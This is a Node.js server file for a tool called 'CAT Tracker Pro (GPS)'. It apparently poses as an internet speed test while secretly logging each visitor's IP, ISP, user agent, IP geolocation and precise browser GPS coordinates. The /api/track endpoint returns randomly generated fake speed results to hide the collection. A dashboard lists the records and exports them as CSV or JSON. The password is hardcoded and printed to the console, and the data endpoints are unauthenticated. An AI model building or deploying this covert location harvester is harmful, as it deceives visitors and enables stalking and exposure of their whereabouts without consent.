const express = require('express');
const axios = require('axios');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const DASHBOARD_PASSWORD = 'catmaster2026';

// ─── Database Setup ──────────────────────────────────────────
const db = new sqlite3.Database('visitors.db');
db.run(`
  CREATE TABLE IF NOT EXISTS visitors (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    ip TEXT,
    country TEXT,
    region TEXT,
    city TEXT,
    lat REAL,
    lon REAL,
    gps_lat REAL,
    gps_lon REAL,
    gps_accuracy REAL,
    isp TEXT,
    user_agent TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
  )
`);

// ─── Middleware ──────────────────────────────────────────────
app.use(express.json());
app.use(express.static('public'));

// ─── Tracking Endpoint ──────────────────────────────────────
app.post('/api/track', async (req, res) => {
  try {
    let ip = req.headers['x-forwarded-for']?.split(',')[0] || 
               req.socket.remoteAddress || 
               req.ip;
    
    let cleanIp = ip.replace('::ffff:', '').replace('::1', '127.0.0.1');
    
    let externalIp = cleanIp;
    if (externalIp === '127.0.0.1' || externalIp === 'localhost' || externalIp === '::1') {
      try {
        const ipRes = await axios.get('https://api.ipify.org?format=json', { timeout: 5000 });
        externalIp = ipRes.data.ip;
      } catch (e) {
        try {
          const ipRes2 = await axios.get('https://api.ip.sb/ip', { timeout: 5000 });
          externalIp = ipRes2.data.trim();
        } catch (e2) {}
      }
    }
    
    const ua = req.headers['user-agent'] || 'unknown';
    
    let geo = { country: 'Unknown', regionName: 'Unknown', city: 'Unknown', lat: 0, lon: 0, isp: 'Unknown' };
    try {
      const geoRes = await axios.get(`http://ip-api.com/json/${externalIp}?fields=status,country,regionName,city,lat,lon,isp`);
      if (geoRes.data.status === 'success') {
        geo = geoRes.data;
      }
    } catch (e) {}
    
    const { gps_lat, gps_lon, gps_accuracy } = req.body;
    
    const finalLat = gps_lat || geo.lat || 0;
    const finalLon = gps_lon || geo.lon || 0;
    
    const visitorData = {
      ip: externalIp,
      country: geo.country || 'Unknown',
      region: geo.regionName || 'Unknown',
      city: geo.city || 'Unknown',
      lat: finalLat,
      lon: finalLon,
      gps_lat: gps_lat || null,
      gps_lon: gps_lon || null,
      gps_accuracy: gps_accuracy || null,
      isp: geo.isp || 'Unknown',
      user_agent: ua
    };
    
    db.run(
      `INSERT INTO visitors (ip, country, region, city, lat, lon, gps_lat, gps_lon, gps_accuracy, isp, user_agent) 
       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
      [visitorData.ip, visitorData.country, visitorData.region, 
       visitorData.city, visitorData.lat, visitorData.lon,
       visitorData.gps_lat, visitorData.gps_lon, visitorData.gps_accuracy,
       visitorData.isp, visitorData.user_agent],
      function(err) {
        if (!err) {
          visitorData.id = this.lastID;
        }
      }
    );
    
    res.json({
      status: 'ok',
      download: (Math.random() * 150 + 30).toFixed(2),
      upload: (Math.random() * 60 + 10).toFixed(2),
      ping: (Math.random() * 40 + 5).toFixed(0),
      server: geo.city || 'Local Node'
    });
    
  } catch (err) {
    console.error('Track error:', err.message);
    res.json({
      status: 'ok',
      download: (Math.random() * 150 + 30).toFixed(2),
      upload: (Math.random() * 60 + 10).toFixed(2),
      ping: (Math.random() * 40 + 5).toFixed(0),
      server: 'Cache Server'
    });
  }
});

// ─── API Routes ──────────────────────────────────────────────
app.post('/api/login', (req, res) => {
  const { password } = req.body;
  res.json({ success: password === DASHBOARD_PASSWORD });
});

app.get('/api/visitors', (req, res) => {
  db.all('SELECT * FROM visitors ORDER BY timestamp DESC LIMIT 100', (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(rows);
  });
});

app.get('/api/export/csv', (req, res) => {
  db.all('SELECT * FROM visitors ORDER BY timestamp DESC', (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    
    let csv = 'ID,IP,Country,Region,City,Latitude,Longitude,GPS_Lat,GPS_Lon,GPS_Accuracy,ISP,UserAgent,Timestamp\n';
    rows.forEach(r => {
      csv += `${r.id},${r.ip},"${r.country}","${r.region}","${r.city}",${r.lat},${r.lon},${r.gps_lat||''},${r.gps_lon||''},${r.gps_accuracy||''},"${r.isp}","${r.user_agent}",${r.timestamp}\n`;
    });
    
    res.setHeader('Content-Type', 'text/csv');
    res.setHeader('Content-Disposition', 'attachment; filename=visitors.csv');
    res.send(csv);
  });
});

app.get('/api/export/json', (req, res) => {
  db.all('SELECT * FROM visitors ORDER BY timestamp DESC', (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.setHeader('Content-Type', 'application/json');
    res.setHeader('Content-Disposition', 'attachment; filename=visitors.json');
    res.json(rows);
  });
});

// ─── Serve Frontend ──────────────────────────────────────────
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/dashboard', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// ─── Start Server ────────────────────────────────────────────
app.listen(PORT, '0.0.0.0', () => {
  console.log(`\n🐱 CAT Tracker Pro (GPS) running on http://0.0.0.0:${PORT}`);
  console.log(`📊 Dashboard: http://0.0.0.0:${PORT}/dashboard`);
  console.log(`🔑 Password: ${DASHBOARD_PASSWORD}\n`);
});